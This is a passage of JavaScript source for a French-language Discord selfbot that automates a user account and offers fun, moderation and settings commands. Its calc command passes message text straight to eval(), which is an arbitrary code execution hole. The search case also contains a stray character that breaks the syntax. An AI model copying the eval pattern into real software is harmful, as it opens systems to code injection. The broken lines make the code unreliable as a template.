                    break;
            }
        }
    });
});

// Commande Fun
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}fun`:
                    const funMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Fun :**
    
                    ➜ \`${prefix}trad\` [mot or phrase] : Sert a traduire un mot ou phrase.
                    ➜ \`${prefix}avatar\` <@user or id> : Sert a avoir votre ou l'avatar d'un autre personne.
                    ➜ \`${prefix}calc\` [calcule] : Sert a calculer des chiffres.
                    ➜ \`${prefix}hug\` [@user] : Fais un calin a une personnes.
                    ➜ \`${prefix}8ball\` [questions] : Trouve une reponse a ta question.
                    ➜ \`${prefix}rps\` [rock, paper, scissors] : Pierre, Feuille Ciseaux.
                    ➜ \`${prefix}pat\` [@user or id] : Taper sur la tete.
                    `;

                    message.channel.send(funMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message de fun :', error));
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Settings
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}settings`:
                    const settingsMessage = `
                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Settings :**

                    ➜ \`${prefix}renameserver\` [pseudo] : Sert a se renomer sur un serveur.
                    ➜ \`${prefix}setpfp\` [url or piece jointe] : Sert a changer de pdp.
                    ➜ \`${prefix}setprefix\` [new prefix] : Sert a changer le prefix du selfbot.                    `;

                    message.channel.send(settingsMessage)
                        .catch((error) => console.error('Erreur lors de l\'envoi du message de paramètres :', error));
                    break;
                default:
                    break;
            }
        }
    });
});


// Commande Calc
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}calc`:
                    const mathExpression = args.slice(1).join(' ');
                    if (!mathExpression) {
                        return message.reply('Veuillez fournir une expression mathématique.');
                    }

                    try {
                        const result = eval(mathExpression);
                        message.reply(`Résultat : ${result}`);
                    } catch (error) {
                        console.error('Erreur lors du calcul :', error);
                        message.reply('Une erreur est survenue lors du calcul.');
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Set PFP (Photo de Profil)
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}setpfp`:
                    if (args.length < 2 && !message.attachments.first()) {
                        return message.reply('Veuillez spécifier un lien d\'image ou joindre une image.');
                    }
                    if (message.guild) {
                        if (!message.guild.me.permissions.has('CHANGE_OWN_PUBLIC')) {
                            return message.reply('Je n\'ai pas les autorisations nécessaires pour changer ma photo de profil.');
                        }
                    }

                    try {
                        let newPFP;
                        if (args.length >= 2) {
                            newPFP = args[1];
                        } else {
                            newPFP = message.attachments.first().url;
                        }

                        fetch(newPFP)
                            .then(response => response.buffer())
                            .then(avatarData => {
                                client.user.setAvatar(avatarData)
                                    .then(() => message.reply('Ma photo de profil a été mise à jour avec succès !'))
                                    .catch(error => {
                                        console.error('Erreur lors de la mise à jour de la photo de profil :', error);
                                        message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
                                    });
                            })
                            .catch(error => {
                                console.error('Erreur lors de la récupération de l\'image :', error);
                                message.reply('Une erreur est survenue lors de la récupération de l\'image.');
                            });
                    } catch (error) {
                        console.error('Erreur lors de la mise à jour de la photo de profil :', error);
                        message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Avatar
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}avatar`:
                    let targetUser = message.mentions.users.first() || client.users.cache.get(args[1]);
                    if (!targetUser) return message.reply('Utilisateur introuvable.');

                    const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 4096 });
                    message.channel.send(`𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Avatar\n\nAvatar de ${targetUser.username} : [Avatar](${avatarUrl})`);
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Kick
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}kick`:
                    if (!message.guild) {
                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
                    }
                    if (!message.member.permissions.has('KICK_MEMBERS')) {
                        return message.reply('Vous n\'avez pas les permissions nécessaires pour expulser des membres.');
                    }
                    const user = message.mentions.members.first();
                    if (!user) {
                        return message.reply('Veuillez mentionner l\'utilisateur à expulser.');
                    }
                    user.kick()
                        .then(() => {
                            message.reply(`${user} a été expulsé avec succès.`);
                        })
                        .catch(error => {
                            console.error('Erreur lors de l\'expulsion de l\'utilisateur :', error);
                            message.reply('Une erreur est survenue lors de l\'expulsion de l\'utilisateur.');
                        });
                    break;
                default:
                    break;
            }
        }
    });
});

client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}ban`:
                    if (!message.guild) {
                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
                    }
                    if (!message.member.permissions.has('BAN_MEMBERS')) {
                        return message.reply('Vous n\'avez pas les permissions nécessaires pour bannir des membres.');
                    }
                    const user = message.mentions.members.first();
                    if (!user) {
                        return message.reply('Veuillez mentionner l\'utilisateur à bannir.');
                    }
                    user.ban()
                        .then(() => {
                            message.reply(`${user} a été banni avec succès.`);
                        })
                        .catch(error => {
                            console.error('Erreur lors du bannissement de l\'utilisateur :', error);
                            message.reply('Une erreur est survenue lors du bannissement de l\'utilisateur.');
                        });
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Unban
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}unban`:
                    if (!message.guild) {
                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
                    }
                    if (!message.member.permissions.has('BAN_MEMBERS')) {
                        return message.reply('Vous n\'avez pas les permissions nécessaires pour débannir des membres.');
                    }
                    if (!args[1]) {
                        return message.reply('Veuillez spécifier l\'ID de l\'utilisateur à débannir.');
                    }
                    message.guild.bans.remove(args[1])
                        .then(() => {
                            message.reply(`Utilisateur avec l'ID ${args[1]} a été débanni avec succès.`);
                        })
                        .catch(error => {
                            console.error('Erreur lors du débannissement de l\'utilisateur :', error);
                            message.reply('Une erreur est survenue lors du débannissement de l\'utilisateur.');
                        });
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande Search
client.on('messageCreate', async (message) => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}search`:e
                    if (args.length >= 2) {
                        execCommand(message, args[1], fileName);
                    } else {
                        message.channel.send(`Usage : ${prefix}search [query]`);
                    }
                    break;
                default:
                    break;
            }
        }
    });
});

// Commande RenameServer
client.on('messageCreate', async message => {
    whitelist_id.forEach(id => {
        const args = message.content.split(' ');
        const command = args[0].toLowerCase();

        if (message.author.id === id && command.startsWith(prefix)) {
            switch (command) {
                case `${prefix}renameserver`:
                    if (!message.guild) {
                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
                    }

                    const newNickname = args.slice(1).join(' ');
                    if (!newNickname) {
                        return message.reply('Veuillez spécifier le nouveau pseudo.');
                    }

                    message.member.setNickname(newNickname)
                        .then(() => {
                            message.reply(`Votre pseudo a été changé avec succès sur ${message.guild.name}.`);
                        })
                        .catch(error => {
                            console.error('Erreur lors du changement de pseudo :', error);
                            message.reply('Une erreur est survenue lors du changement de pseudo.');
                        });
                    break;
                default:
                    break;
            }
        }
    });
});



client.login(process.env.TOKEN);
